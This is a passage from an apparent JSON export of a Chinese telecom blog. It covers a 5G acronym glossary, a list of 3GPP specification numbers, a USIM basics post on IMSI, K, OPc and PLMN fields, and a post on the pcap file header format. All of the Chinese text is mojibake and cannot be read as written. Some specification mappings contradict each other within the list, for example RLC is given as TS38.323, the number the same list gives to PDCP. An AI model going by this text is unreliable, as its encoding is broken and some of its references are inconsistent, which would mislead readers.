äººç©ºä¸­ç³»ç»Ÿ UAV Uncrewed Aerial Vehicle æ— äººé©¾é©¶é£è¡Œå™¨ UDM Unified Data Management ç»Ÿä¸€æ•°æ®ç®¡ç† UL Uplink ä¸Šè¡Œé“¾è·¯ UPDS UE policy delivery service UE ç­–ç•¥äº¤ä»˜æœåŠ¡ UPF User Plane Function ç”¨æˆ·é¢åŠŸèƒ½ UPSC UE Policy Section Code UE ç­–ç•¥éƒ¨åˆ†ä»£ç  UPSI UE Policy Section Identifier UE ç­–ç•¥éƒ¨åˆ†æ ‡è¯†ç¬¦ URN Uniform Resource Name ç»Ÿä¸€èµ„æºåç§° URSP UE Route Selection Policy UE è·¯ç”±é€‰æ‹©ç­–ç•¥ USS UAS Service Supplier UAS æœåŠ¡ä¾›åº”å•† UUAA USS UAV Authorization/Authentication USS æ— äººæœºæˆæƒ/è®¤è¯ V2X Vehicle-to-Everything è½¦è”ç½‘ V2XP V2X policy V2X ç­–ç•¥ W-AGF Wireline Access Gateway Function æœ‰çº¿æ¥å…¥ç½‘å…³åŠŸèƒ½ WLAN Wireless Local Area Network æ— çº¿å±€åŸŸç½‘ WUS Wake-up signal å”¤é†’ä¿¡å·","categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"LTE","slug":"æŠ€æœ¯å‘/LTE","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/LTE/"}],"tags":[{"name":"LTE","slug":"LTE","permalink":"https://www.sizaif.com/tags/LTE/"},{"name":"5G","slug":"5G","permalink":"https://www.sizaif.com/tags/5G/"}],"author":"sizaif"},{"title":"3GPP 5G å¸¸ç”¨åè®®è§„èŒƒä¸‹è½½æ•´ç†","slug":"3GPP-5G-å¸¸ç”¨åè®®è§„èŒƒä¸‹è½½æ•´ç†","date":"2021-11-13T02:18:57.000Z","updated":"2021-11-14T06:54:40.330Z","comments":true,"path":"posts/be65a0a1/","link":"","permalink":"https://www.sizaif.com/posts/be65a0a1/","excerpt":"","text":"å¸¸ç”¨åè®®æ ‡å‡† ç³»ç»Ÿæ¶æ„ ç¼–å· åè®® å…¨ç§° æè¿° ä¸‹è½½åœ°å€ 1 RAN Architecture NG-RAN Architecture description ç³»ç»Ÿæ¶æ„ TS 38.473 2 Overall NR and NG-RAN Overall Description NR and NG-RAN æ€»ä½“æŠ€æœ¯è¦æ±‚ TS 38.300 3 5GS NG-RAN Architecture description ç³»ç»Ÿæ¶æ„ TS 23.501 4 5GC Procedures for the 5G System (5GS) ç³»ç»Ÿæ¶æ„ TS 23.502 æ— çº¿ä¾§ï¼ˆRAN/NRï¼‰ ç¼–å· åè®® å…¨ç§° æè¿° ä¸‹è½½åœ°å€ 1 RRC Radio Resource Control æ— çº¿èµ„æºæ§åˆ¶ TS 38.331 2 SDAP Service Data Adaptation Protocol æœåŠ¡æ•°æ®é€‚é…åè®® TS 37.324 3 PDCP Packet Data Convergence Protocol åˆ†ç»„æ•°æ®æ±‡èšåè®® TS 38.323 4 RLC Radio Link Control æ— çº¿é“¾è·¯å±‚æ§åˆ¶åè®® TS 38.322 5 MAC Media Access Control åª’ä½“æ¥å…¥æ§åˆ¶åè®® TS 38.321 6 F1Ap F1 Application Protocol F1 åº”ç”¨ç¨‹åºåè®® TS 38.401 7 XnAp Xn Application Protocol Xn åº”ç”¨ç¨‹åºåè®® TS 38.423 æ ¸å¿ƒç½‘ï¼ˆCN/5GCï¼‰ ç¼–å· åè®® å…¨ç¨‹ æè¿° ä¸‹è½½åœ°å€ 1 NgAp NG Application Protocol NG åº”ç”¨ç¨‹åºåè®® TS 38.413 2 NAS Non-Access-Stratum éæ¥å…¥å±‚ TS 24.501 3 PCF Policy Control Function ç­–ç•¥æ§åˆ¶åŠŸèƒ½ TS 29.507 3GPPåè®®ä¸‹è½½é“¾æ¥ æ•´ä½“ æ•´ä½“æè¿°ï¼šTS38.300 5Gæ¥å…¥ç½‘æ¶æ„ï¼šTS38.401 é¢‘ç‚¹ç›¸å…³ é¢‘ç‡ã€é¢‘ç‚¹ç›¸å…³F R1ï¼šTS38.101-1 é¢‘ç‡ã€é¢‘ç‚¹ç›¸å…³F R2ï¼šTS38.101-2 EN-DCç›¸å…³ï¼šTS38.101-3 é¢‘ç‡ã€é¢‘ç‚¹ç›¸å…³åŸºç«™ç±»å‹ï¼šTS38.104 ç©ºå£åè®®L2L3 SDAPå±‚åè®®ï¼šTS37.324 5G-RANæ— çº¿æ¥å£æ¡†æ¶æ€»ä½“æè¿°ï¼šTS38.300 å®šä¹‰äº†UEç©ºé—²æ€å’Œéæ´»åŠ¨æ€ä¸‹è½½æ¥å…¥å±‚éƒ¨åˆ†çš„è¿‡ç¨‹ï¼ˆåŒ…æ‹¬PLMNé€‰æ‹©ã€å°åŒºé€‰æ‹©ã€é‡é€‰ç›¸å…³é—¨é™ï¼‰ï¼šTS38.304 MACå±‚åè®®ï¼šTS38.321 RLCåè®®å±‚ï¼šTS38.323 RRCå±‚åè®®ï¼šTS38.331 ç©ºå£åè®®å±‚L1 ç‰©ç†å±‚æ¦‚è¿°ï¼šTS38.201 ç‰©ç†å±‚çš„åŠŸèƒ½ä¸æœåŠ¡ï¼šTS38.202 ç‰©ç†å±‚ä¿¡é“å®šä¹‰ï¼šTS38.211ï¼ˆç‰©ç†å±‚ä¿¡å·çš„ç”Ÿæˆã€è°ƒåˆ¶ï¼ŒDMRSå’Œé¢å¤–DMRSï¼ŒPRACH configuration indexï¼ŒPoint Aç­‰ä»‹ç»ï¼‰ ä¼ è¾“ä¿¡é“å’Œæ§åˆ¶ä¿¡é“çš„æ•°æ®å¤„ç†ï¼šTS38.212ï¼ˆåŒ…æ‹¬å¤ç”¨ï¼Œä¿¡é“ç¼–ç ï¼Œäº¤ç»‡ï¼ŒDCIï¼ŒDMRSç«¯å£å·ç­‰ï¼‰ ç‰©ç†å±‚æ§åˆ¶è¿‡ç¨‹ï¼šTS38.213ï¼ˆåŒæ­¥ï¼Œä¸Šè¡ŒåŠŸæ§ï¼Œéšæœºæ¥å…¥ï¼ŒUEä¸ŠæŠ¥å’Œæ¥æ”¶æ§åˆ¶æ¶ˆæ¯çš„è¿‡ç¨‹ï¼ŒSSBç­‰ï¼‰ ç‰©ç†å±‚æ•°æ®è¿‡ç¨‹ï¼šTS38.214ï¼ˆåŠŸç‡æ§åˆ¶ï¼ŒPDSCH PUSCHæ•°æ®å¤„ç†è¿‡ç¨‹ï¼Œæ­¥é•¿275ï¼‰ ç‰©ç†å±‚æµ‹é‡ï¼šTS38.215ï¼ˆUEå’Œç½‘ç»œçš„æµ‹é‡æ§åˆ¶ï¼ŒUEæµ‹é‡èƒ½åŠ›ï¼‰ Xnå£åè®® Xnæ¥å£ç»¼è¿°ï¼šTS38.420 Xnå£ç‰©ç†å±‚ï¼šTS38.421 Xnå¦‚ä½•ä¼ ä¿¡ä»¤ï¼šTS38.422 NG-RANä¿¡ä»¤ï¼šTS38.423 Xnæ•°æ®ä¼ è¾“è§„èŒƒï¼šTS38.424 Xnç”¨æˆ·é¢åè®®æ ˆï¼šTS38.425 NR UEèƒ½åŠ›ç›¸å…³ æ‰‹æœºçš„æœ€ä½æ€§èƒ½è¦æ±‚ï¼šTS38.101-4 ç»ˆç«¯å®šä½ç›¸å…³åè®®ï¼šTS38.305 UEåœ¨æ¥å…¥ç½‘çš„èƒ½åŠ›å‚æ•°ï¼šTS38.306 UEæ”¯æŒçš„ç‰¹æ€§è¦æ±‚ï¼šTS38.307 NGæ¥å£åè®® NGæ¥å£ç»¼è¿°ï¼šTS38.410 NGæ¥å£ç›¸å…³ç‰©ç†å±‚ï¼šTS38.411 NGå¦‚ä½•ä¼ è¾“ä¿¡ä»¤æ¶ˆæ¯ï¼šTS38.412 NG-RANå’ŒAMFæ§åˆ¶ä¿¡ä»¤ï¼šTS38.413 NGæ¥å£ç”¨æˆ·é¢æ•°æ®ï¼šTS38.414 ç”¨æˆ·é¢åè®®ï¼šTS38.415 F1æ¥å£åè®® æ¶æ„ç»¼è¿°ï¼šTS38.470 ç‰©ç†å±‚ï¼šTS38.471 ä¿¡ä»¤å¦‚ä½•ä¼ ï¼šTS38.472 æ§åˆ¶é¢ï¼šTS38.473 æ•°æ®é¢ï¼šTS38.474 æ•°æ®é¢åè®®ï¼šTS38.475","categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"LTE","slug":"æŠ€æœ¯å‘/LTE","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/LTE/"}],"tags":[{"name":"LTE","slug":"LTE","permalink":"https://www.sizaif.com/tags/LTE/"},{"name":"5G","slug":"5G","permalink":"https://www.sizaif.com/tags/5G/"}],"author":"sizaif"},{"title":"LTE(4G)â€“USIMåŸºç¡€","slug":"LTE-4G-â€“USIMåŸºç¡€","date":"2021-11-13T01:42:43.000Z","updated":"2021-11-13T02:43:12.944Z","comments":true,"path":"posts/a71e591c/","link":"","permalink":"https://www.sizaif.com/posts/a71e591c/","excerpt":"","text":"USIMæ˜¯åœ¨èº«ä»½éªŒè¯ä¸­çš„ä½œç”¨ å½“æ‚¨å¯åŠ¨æ‰‹æœºæ—¶ï¼Œå…¶ä¸­çš„åŸºå¸¦æ¨¡å—ä¼šä¸å¡ä¸Šçš„ USIM åº”ç”¨ç¨‹åºè¿›è¡Œé€šä¿¡ã€‚ å½“éœ€è¦å‘ç½‘ç»œè¿›è¡Œèº«ä»½éªŒè¯å¹¶éªŒè¯ç½‘ç»œæœ¬èº«æ—¶ï¼ŒåŸºå¸¦æ¨¡å—å°†æä¾›çš„è´¨è¯¢ä¿¡æ¯ä»ç½‘ç»œå‘é€åˆ° USIMï¼ŒUSIM æ‰§è¡ŒåŠ å¯†ä»¥ç”Ÿæˆå¯¹ç½‘ç»œå‘å‡ºçš„èº«ä»½éªŒè¯è´¨è¯¢çš„å“åº”ï¼Œç„¶å USIMé—®é¢˜æ˜¯å®ƒè‡ªå·±å¯¹ç½‘ç»œçš„æŒ‘æˆ˜ã€‚ Whatâ€™s Inside? æ‰€æœ‰GSMç”¨äºä¼ ç»ŸSIMåº”ç”¨ç¨‹åºçš„GSMå†…å®¹ ä¸€èˆ¬æ¥è¯´USIMä¹Ÿæœ‰èƒ½åŠ›åœ¨GSMç½‘ç»œä¸­ä½œä¸ºSIMsè¿è¡Œï¼Œæ¯•ç«Ÿå®ƒåªæ˜¯ä¸€ä¸ªä¸åŒçš„è½¯ä»¶å †æ ˆã€‚æˆ‘ä»¬åœ¨è¿™é‡Œä¸æ¶‰åŠGSM SIMã€‚ ICCID ç”±äºUSIMåªæ˜¯åœ¨é€šç”¨é›†æˆç”µè·¯å¡ä¸Šè¿è¡Œçš„åº”ç”¨ç¨‹åºï¼Œå› æ­¤å®ƒå¾—åˆ°äº†ICCIDæˆ–é€šç”¨é›†æˆç”µè·¯å¡IDã€‚é€šå¸¸è¿™æ˜¯å¡æœ¬èº«ä¸Šå°æœ‰çš„é•¿æ¡å½¢ç /æ•°é‡ã€‚ ç½‘ç»œä¸€èˆ¬ä¸å…³å¿ƒè¿™ä¸ªå€¼ï¼Œä½†è¿è¥å•†å¯èƒ½ä¼šæŠŠå®ƒç”¨äºç‰©æµï¼Œå¦‚å‘è´§å¡ã€‚ PIN &amp; PUK pinå’ŒPUKsæ˜¯è§£é”å¡çš„å¯†ç ã€‚å¦‚æœä½ çš„PINé”™äº†å¤ªå¤šæ¬¡ï¼Œä½ éœ€è¦æ›´é•¿çš„PUKæ¥è§£é”å®ƒã€‚ è¿™äº›å­—æ®µå¯ä»¥å†™å…¥(åœ¨éªŒè¯åˆ°å¡ç‰‡æ—¶)ï¼Œä½†ä¸èƒ½ç›´æ¥è¯»å–ï¼Œåªæœ‰å°è¯•ã€‚(ä½ å¯ä»¥å°è¯•ä¸€ä¸ªå¯†ç ï¼Œä½†ä½ ä¸èƒ½çœ‹åˆ°å®ƒçš„è®¾ç½®)ã€‚ æ­£å¦‚æˆ‘ä»¬ä¹‹å‰æåˆ°çš„ï¼Œç»ˆç«¯ä¼šè¯¢é—®å¡æ˜¯å¦æ­£ç¡®ï¼Œä½†ç»ˆç«¯ä¹Ÿä¸çŸ¥é“å¯†ç ã€‚ IMSI æ¯ä¸ªè®¢é˜…è€…éƒ½æœ‰ä¸€ä¸ªIMSIï¼Œæ˜¯ä¸€ä¸ªå›½é™…ç§»åŠ¨ç”¨æˆ·æ ‡è¯†ã€‚ IMSISæ˜¯åˆ†å±‚çš„ï¼Œä»3ä½æ•°ç§»åŠ¨å›½å®¶/åœ°åŒºä»£ç MCCå¼€å§‹ï¼Œç„¶åç§»åŠ¨ç½‘ç»œä»£ç (MNC)(2/3ä½)ä»¥åŠæœ€ç»ˆæ˜¯ç§»åŠ¨è®¢é˜…è¯†åˆ«å·(MSIN)ï¼Œç”±æ“ä½œå‘˜åˆ†é…ç»™ç”¨æˆ·çš„å”¯ä¸€å·ç ç½‘ç»œã€‚ è¿™æ„å‘³ç€è™½ç„¶ä¸¤ä¸ªè®¢é˜…è€…ç†è®ºä¸Šå¯ä»¥å…·æœ‰ç›¸åŒçš„MSINï¼Œä½†å®ƒä»¬ä¸ä¼šåˆ†äº«ç›¸åŒçš„MNCå’ŒMCCï¼Œå› æ­¤ISMIä»ç„¶æ˜¯å”¯ä¸€çš„ã€‚ é™¤éè®¢æˆ·æ›´æ”¹è¿è¥å•†æ—¶ï¼ŒIMSIæ°¸è¿œä¸ä¼šå‘ç”Ÿå˜åŒ–ï¼Œé™¤éæ–°çš„æ“ä½œå‘˜å‘å‡ºæ–°çš„USIMå¡ï¼Œå…·æœ‰ä¸åŒçš„IMSIï¼ˆä¸åŒçš„MNCï¼‰ã€‚ MSINä¸ç”µè¯å·ç /MSISDNå·ç ä¸åŒï¼Œä½†IMSIé€šå¸¸å…·æœ‰ç½‘ç»œç›¸å…³è”çš„MSISDNã€‚è¿™å…è®¸æ‚¨åœ¨ä¸æ›´æ”¹USIM / SIMçš„æƒ…å†µä¸‹ç§»æ¤/æ›´æ”¹MSISDNå·ç ã€‚ K â€“ Subscriber Key ä»…é’ˆå¯¹è®¢æˆ·å’Œè®¤è¯ä¸­å¿ƒ(AUC/HSS)å·²çŸ¥çš„è®¢æˆ·çš„ç§˜å¯†å¯†é’¥ã€‚ æ‰€æœ‰èº«ä»½éªŒè¯éƒ½ä¾èµ–äºä»…ä¸ºUSIMå’ŒAUC/HHSå·²çŸ¥çš„å•ä¸ªå¯†é’¥(k)çš„åŸåˆ™ã€‚ OP â€“ Operator Code æ“ä½œå‘˜ä»£ç  - æ¥è‡ªå•ä¸ªæ“ä½œå‘˜çš„æ‰€æœ‰SIMå¡ç›¸åŒã€‚ ä¸Kç»“åˆä½¿ç”¨ä½œä¸ºä¸€äº›èº«ä»½éªŒè¯/æˆæƒåŠ å¯†ç”Ÿæˆçš„è¾“å…¥ã€‚ ç”±äºæ“ä½œå‘˜ä»£ç å¯¹ç½‘ç»œä¸­çš„æ‰€æœ‰è®¢é˜…è€…éƒ½æ˜¯é€šç”¨çš„ï¼Œå› ä¸ºè¦æ¢å¤æ­¤å¯†é’¥å¯èƒ½ä¼šå¯¼è‡´å®‰å…¨é—®é¢˜ï¼Œå› æ­¤é€šå¸¸ä½¿ç”¨OPCã€‚ OPc â€“ Operator Code (Derived) å½“USIMç”¨Ké”®å†™å…¥USIMæ—¶ï¼Œå¯ä»¥é¢„å…ˆè®¡ç®—Operatorä»£ç ï¼Œè€Œä¸æ˜¯ç»™å‡ºæ¯ä¸ªUSIMçš„æ“ä½œå‘˜ä»£ç ã€‚ è¿™æ„å‘³ç€OPä¸å­˜å‚¨åœ¨USIMä¸Šã€‚ OPc=Encypt-Algo(OP,Key) PLMN (Public Land Mobile Network) PLMNæ˜¯MCCå’ŒMNCçš„ç»„åˆï¼Œç”¨äºè¯†åˆ«è¿è¥å•†çš„æ— çº¿æ¥å…¥ç½‘(RAN)ã€‚ è™½ç„¶åœ¨å¤§å¤šæ•°USIMsä¸­æ²¡æœ‰ç‰¹å®šçš„PLMNå­—æ®µï¼Œä½†å€¼å¾—ç†è§£çš„æ˜¯ï¼Œæœ‰å‡ ä¸ªå­—æ®µéœ€è¦PLMNã€‚ HPLMNwAcT (HPLMN selector with Access Technology) æŒ‰ä¼˜å…ˆçº§é¡ºåºåŒ…å«æŒ‡å®šæ¥å…¥æŠ€æœ¯çš„Home-PLMNç¼–ç  è¿™å…è®¸USIMè®¡ç®—å‡ºå“ªä¸ªPLMNé™„åŠ åˆ°å“ªä¸ªè®¿é—®æŠ€æœ¯(RAN)ï¼Œä¾‹å¦‚ï¼Œå¦‚æœæ“ä½œå‘˜çš„PLMNæ˜¯50599ï¼Œæˆ‘ä»¬å¯ä»¥ 50599 E-UTRAN 50599 UTRAN å°è¯•4Gï¼Œå¦‚æœå¤±è´¥äº†å°±ä½¿ç”¨3Gã€‚ åœ¨è¿è¥å•†å¯èƒ½åˆä½œå…±äº«ä¸åŒåœ°åŒºçš„ç½‘ç»œçš„æƒ…å†µä¸‹ï¼Œå¯ä»¥å…ˆè®¾ç½®è¿è¥å•†çš„PLMNï¼Œç„¶åå†è®¾ç½®åˆä½œè¿è¥å•†çš„PLMNã€‚ OPLMNwACT (Operator controlled PLMN selector with Access Technology) è¿™æ˜¯è¿è¥å•†ä¸ä¼˜å…ˆé¡ºåºå’Œè®¿é—®æŠ€æœ¯æœ‰å…³æ¼«æ¸¸åè®®çš„PLMNSåˆ—è¡¨ã€‚ æ“ä½œå‘˜å¯ä»¥æ¼«æ¸¸åˆ°è¿è¥å•†Xï¼Œä½†ä»…å…è®¸UTRANè®¿é—®ï¼Œè€Œä¸æ˜¯E-TRANã€‚ FEHPLMN (Equivalent HPLMN) ç”¨äºå®šä¹‰ç­‰æ•ˆçš„HPMNï¼Œä¾‹å¦‚ï¼Œå¦‚æœä¸¤ä¸ªè½½æ³¢åˆå¹¶å¹¶ä»æœ‰ä¸¤ä¸ªPLMNã€‚ FPLMN (Forbidden PLMN list) ç”¨æˆ·ä¸èƒ½æµè§ˆçš„plmnåˆ—è¡¨ã€‚ HPPLMN (Higher Priority PLMN search period) åœ¨HPLMNWACTåˆ—è¡¨ä¸­çš„æ¯ä¸ªPLMN / AccessæŠ€æœ¯ä¹‹é—´èŠ±è´¹å¤šé•¿æ—¶é—´ã€‚ ACC (Access Control Class) ACCå…è®¸0-15çš„å€¼ï¼Œå¹¶ç¡®å®šè®¢æˆ·çš„è®¿é—®æ§åˆ¶ç±»ã€‚ åœ¨è‹±å›½ï¼ŒACCå€¼ç”¨äºé™åˆ¶ç´§æ€¥æƒ…å†µæœŸé—´å¯¹æ‰‹æœºç½‘ç»œçš„å¹³æ°‘è®¿é—®ã€‚ æ™®é€šç”¨æˆ·åœ¨0 - 9.è¾ƒé«˜çš„ä¼˜å…ˆçº§ç”¨æˆ·åˆ†é…12-14ä¸­çš„æ™®é€šè®¢é˜…è€…ã€‚ åœ¨ç´§æ€¥æƒ…å†µä¸‹ï¼Œç¦ç”¨èŒƒå›´0 - 9ä¸­çš„æŸäº›æˆ–æ‰€æœ‰è®¿é—®ç±»ã€‚ è¿™æ„å‘³ç€å¯ä»¥å°†æœåŠ¡æˆªæ­¢åˆ°å…·æœ‰0-9çš„ACCå€¼çš„å…¬ä¼—ï¼Œä½†ç¬¬ä¸€ä¸ªå“åº”è€…å’Œç´§æ€¥æœåŠ¡ç­‰äººå°†å…·æœ‰æ›´é«˜çš„ACCå€¼ï¼Œç½‘ç»œå°†å…è®¸å®ƒä»¬é™„åŠ ã€‚ AD (Administrative Data) ä¸ACCå­—æ®µä¸€æ ·ï¼ŒADå­—æ®µå…è®¸è¿è¥å•†åœ¨æ²¡æœ‰ä¸ç½‘ç»œé™„åŠ çš„æœ‰æ•ˆæ”¯ä»˜è®¢é˜…è€…çš„æƒ…å†µä¸‹é©±åŠ¨æµ‹è¯•ç½‘ç»œ The defined levels are: '00â€™æ­£å¸¸è¿è¡Œã€‚ '80â€™å‹æ‰¹å‡†æ“ä½œã€‚ '01â€™æ­£å¸¸è¿è¡Œ+ç‰¹å®šè®¾æ–½ã€‚ '81â€™å‹æ‰¹å‡†æ“ä½œ+ç‰¹å®šè®¾æ–½ã€‚ '02â€™ç»´æŠ¤ï¼ˆç¦»çº¿ï¼‰ã€‚ '04â€™å•å…ƒæµ‹è¯•æ“ä½œã€‚ GID 1 / 2 â€“ Group Identifier ä¸¤ä¸ªç»„æ ‡è¯†ç¬¦å­—æ®µï¼Œå…è®¸æ“ä½œç¬¦ä¸ºç‰¹å®šåº”ç”¨ç¨‹åºæ ‡è¯†ä¸€ç»„USIMsã€‚ SPN (Service Provider Name) SPNæ˜¯åŒ…å«ç½‘ç»œçš„äººç±»å¯è¯»åç§°çš„å¯é€‰å­—æ®µã€‚ SPNå…è®¸MVNOSä»¥æ‰‹æœºä¸Šçš„æ“ä½œå‘˜æä¾›è‡ªå·±çš„USIMã€‚ ECC (Emergency Call Codes) å¤šè¾¾6ä½æ•°çš„ä»£ç é•¿æ—¶é—´å…è®¸ä»ä¸»å±å¹•/ç´§æ€¥/ä¸ç»è¿‡èº«ä»½éªŒè¯ç­‰æ‹¨å·ã€‚ MSISDN ç§»åŠ¨å°å›½é™…è®¢æˆ·ç›®å½•å·ç ã€‚E.164æ ¼å¼çš„ç”¨æˆ·çš„ç”µè¯å·ç ã€‚ è¿™æ˜¯å¯é€‰çš„ï¼Œå› ä¸ºç§»æ¤å¯èƒ½ä¼šè¦†ç›–æ­¤æ“ä½œï¼Œå› æ­¤å®ƒå¹¶ä¸æ€»æ˜¯åŒ¹é…ã€‚","categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"LTE","slug":"æŠ€æœ¯å‘/LTE","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/LTE/"}],"tags":[{"name":"LTE","slug":"LTE","permalink":"https://www.sizaif.com/tags/LTE/"},{"name":"USIM","slug":"USIM","permalink":"https://www.sizaif.com/tags/USIM/"}],"author":"sizaif"},{"title":".PcapåŒ…å­¦ä¹ ","slug":"PcapåŒ…å­¦ä¹ ","date":"2021-11-06T02:13:04.000Z","updated":"2021-11-06T02:19:55.355Z","comments":true,"path":"posts/a30ed9b8/","link":"","permalink":"https://www.sizaif.com/posts/a30ed9b8/","excerpt":"","text":".pacp/.cap æ–‡ä»¶ç»“æ„ 1.Pcap Header æ–‡ä»¶å¤´ï¼Œæ¯ä¸€ä¸ªpcapæ–‡ä»¶åªæœ‰ä¸€ä¸ªæ–‡ä»¶å¤´ï¼Œæ€»å…±å 24ï¼ˆB ï¼‰å­—èŠ‚ï¼Œä»¥ä¸‹æ˜¯æ€»å…±7ä¸ªå­—æ®µçš„å«ä¹‰ã€‚ detail Magic(4B)ï¼š æ ‡è®°æ–‡ä»¶å¼€å§‹ï¼Œå¹¶ç”¨æ¥è¯†åˆ«æ–‡ä»¶å’Œå­—èŠ‚é¡ºåºã€‚å€¼å¯ä»¥ä¸º0xa1b2c3d4æˆ–è€…0xd4c3b2a1ï¼Œå¦‚æœæ˜¯0xa1b2c3d4è¡¨ç¤ºæ˜¯å¤§ç«¯æ¨¡å¼ï¼ŒæŒ‰ç…§åŸæ¥çš„é¡ºåºä¸€ä¸ªå­—èŠ‚ä¸€ä¸ªå­—èŠ‚çš„è¯»ï¼Œå¦‚æœæ˜¯0xd4c3b2a1è¡¨ç¤ºå°ç«¯æ¨¡å¼ï¼Œä¸‹é¢çš„å­—èŠ‚éƒ½è¦äº¤æ¢é¡ºåº(ä»åå¾€å‰)ã€‚ç°åœ¨çš„ç”µè„‘å¤§éƒ¨åˆ†æ˜¯å°ç«¯æ¨¡å¼ã€‚Major(2B)ï¼š å½“å‰æ–‡ä»¶çš„ä¸»è¦ç‰ˆæœ¬å·ï¼Œä¸€èˆ¬ä¸º0x0200Minor(2B)ï¼š å½“å‰æ–‡ä»¶çš„æ¬¡è¦ç‰ˆæœ¬å·ï¼Œä¸€èˆ¬ä¸º0x0400ThisZone(4B)ï¼š å½“åœ°çš„æ ‡å‡†äº‹ä»¶ï¼Œå¦‚æœç”¨çš„æ˜¯GMTåˆ™å…¨é›¶ï¼Œä¸€èˆ¬å…¨é›¶SigFigs(4B)ï¼š æ—¶é—´æˆ³çš„ç²¾åº¦ï¼Œä¸€èˆ¬ä¸ºå…¨é›¶SnapLen(4B)ï¼š æœ€å¤§çš„å­˜å‚¨é•¿åº¦ï¼Œè®¾ç½®æ‰€æŠ“è·çš„æ•°æ®åŒ…çš„æœ€å¤§é•¿åº¦ï¼Œå¦‚æœæ‰€æœ‰æ•°æ®åŒ…éƒ½è¦æŠ“è·ï¼Œå°†å€¼è®¾ç½®ä¸º65535LinkType(4B)ï¼š é“¾è·¯ç±»å‹ã€‚è§£ææ•°æ®åŒ…é¦–å…ˆè¦åˆ¤æ–­å®ƒçš„LinkTypeï¼Œæ‰€ä»¥è¿™ä¸ªå€¼å¾ˆé‡è¦ã€‚ä¸€èˆ¬çš„å€¼ä¸º1ï¼Œå³ä»¥å¤ªç½‘å¸¸ç”¨çš„LinkTypeï¼ˆé“¾è·¯ç±»å‹ï¼‰ï¼šå€¼ç±»å‹æè¿°0BSD loopback devices, except for later OpenBSD1Ethernet, and Linux loopback devices6802.5 Token Ring7ARCnet8SLIP9PPP10FDDI100LLC/SNAP-encapsulated ATM101â€œraw IPâ€, with no link102BSD/OS SLIP103BSD/OS PPP104Cisco HDLC105802.11108later OpenBSD loopback devices (with the AF_value in network byte order)113special Linux â€œcookedâ€ capture114LocalTalk â€‹ 2.Packet Header æ•°æ®åŒ…å¤´å¯ä»¥æœ‰å¤šä¸ªï¼Œæ¯ä¸ªæ•°æ®åŒ…å¤´åé¢éƒ½è·Ÿç€çœŸæ­£çš„æ•°æ®åŒ…ã€‚ä»¥ä¸‹æ˜¯Packet Headerçš„4ä¸ªå­—æ®µå«ä¹‰ Timestamp(4B)ï¼š æ—¶é—´æˆ³é«˜ä½ï¼Œç²¾ç¡®åˆ°secondsï¼Œè¿™æ˜¯Unixæ—¶é—´æˆ³ã€‚æ•è·æ•°æ®åŒ…çš„æ—¶é—´ä¸€èˆ¬æ˜¯æ ¹æ®è¿™ä¸ªå€¼ Timestamp(4B)ï¼š æ—¶é—´æˆ³ä½ä½ï¼Œèƒ½å¤Ÿç²¾ç¡®åˆ°microseconds Caplen(4B)ï¼š å½“å‰æ•°æ®åŒºçš„é•¿åº¦ï¼Œå³æŠ“å–åˆ°çš„æ•°æ®å¸§é•¿åº¦ï¼Œç”±æ­¤å¯ä»¥å¾—åˆ°ä¸‹ä¸€ä¸ªæ•°æ®å¸§çš„ä½ç½®ã€‚ Len(4B)ï¼š ç¦»çº¿æ•°æ®é•¿åº¦ï¼Œç½‘è·¯ä¸­å®é™…æ•°æ®å¸§çš„é•¿åº¦ï¼Œä¸€èˆ¬ä¸å¤§äºCaplenï¼Œå¤šæ•°æƒ…å†µä¸‹å’ŒCaplenå€¼ä¸€æ · 3.Packet Data Packetæ˜¯é“¾è·¯å±‚çš„æ•°æ®å¸§ï¼Œé•¿åº¦å°±æ˜¯Packet Headerä¸­å®šä¹‰çš„Caplenå€¼ï¼Œæ‰€ä»¥æ¯ä¸ªPacket Headeråé¢éƒ½è·Ÿç€Caplené•¿åº¦çš„Packet Dataã€‚ä¹Ÿå°±æ˜¯è¯´pcapæ–‡ä»¶å¹¶æ²¡æœ‰è§„å®šæ•è·çš„æ•°æ®å¸§ä¹‹é—´æœ‰ä»€ä¹ˆé—´éš”å­—ç¬¦ä¸²ã€‚Packetæ•°æ®å¸§éƒ¨åˆ†çš„æ ¼å¼å°±æ˜¯æ ‡å‡†çš„ç½‘ç»œåè®®æ ¼å¼äº†ã€‚ egï¼š ä¸‹å›¾ä¸º16è¿›åˆ¶pcapæ–‡ä»¶ï¼š å¤‡æ³¨ï¼š çº¢è‰²éƒ¨åˆ†ï¼šPcap Header è“è‰²éƒ¨åˆ†ï¼šPacket Header PcapHeader Magic(4B)ï¼š D4 C3 B2 A1 è¡¨ç¤ºå°ç«¯æ¨¡å¼ï¼Œåé¢çš„å­—èŠ‚ä»åå¾€å‰è¯»ï¼› Major(2B)ï¼š 02 00ï¼Œè®¡ç®—æœºè¯»çš„æ˜¯00 02ï¼› Minor(2B)ï¼š 04 00ï¼Œè®¡ç®—æœºè¯»çš„æ˜¯00 04ï¼› ThisZone(4B)ï¼š 00 00 00 00ï¼Œå…¨é›¶ï¼› SigFigs(4B)ï¼š 00 00 00 00ï¼Œå…¨é›¶ï¼› SnapLen(4B)ï¼š FF FF 00 00, è®¡ç®—æœºè¯»çš„æ˜¯ï¼š00 00 FF FFï¼Œæ‰€ä»¥æ˜¯2^16-1=65535 LinkType(4B)ï¼š 01 00 00 00, è®¡ç®—æœºè¯»çš„æ˜¯ï¼š00 00 00 01ï¼Œè¡¨ç¤ºæ˜¯ä»¥å¤ªç½‘ç±»å‹ Packet Header Timestamp(4B)ï¼š CA 4D A4 5Cï¼Œè®¡ç®—æœºè¯»çš„æ˜¯ï¼š5C A4 4D CAï¼Œåè¿›åˆ¶ï¼š1554271690ï¼Œæ—¥æœŸä¸ºï¼š2019-04-03 14:08:10ï¼› Timestamp(4B)ï¼š 4F 2A 08 